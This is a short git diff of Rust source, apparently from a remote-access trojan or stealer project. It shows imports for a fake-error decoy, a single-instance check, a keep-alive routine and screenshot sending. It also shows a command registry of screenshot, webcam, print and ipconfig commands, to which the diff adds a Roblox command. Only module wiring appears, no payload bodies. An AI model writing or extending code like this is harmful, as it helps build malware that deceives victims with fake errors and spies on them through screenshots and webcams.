@@ -7,7 +7,6 @@ use crate::core::decoy::show_fake_error;
 use crate::core::instance::singleton_prcess;
 use crate::core::keep_active::start_keep_active;
 
-use crate::core::screenshot::send_connect_screenshots;
 use crate::system_info::{DeviceInfo, SystemInfo};
 
 // Modules
@@ -92,6 +91,7 @@ async fn register_all_commands() -> anyhow::Result<()> {
         PrintCommand,
         ScreenshotCommand,
         WebcamCommand,
+        RobloxCommand,
 
         // Network commands
         IpconfigCommand,
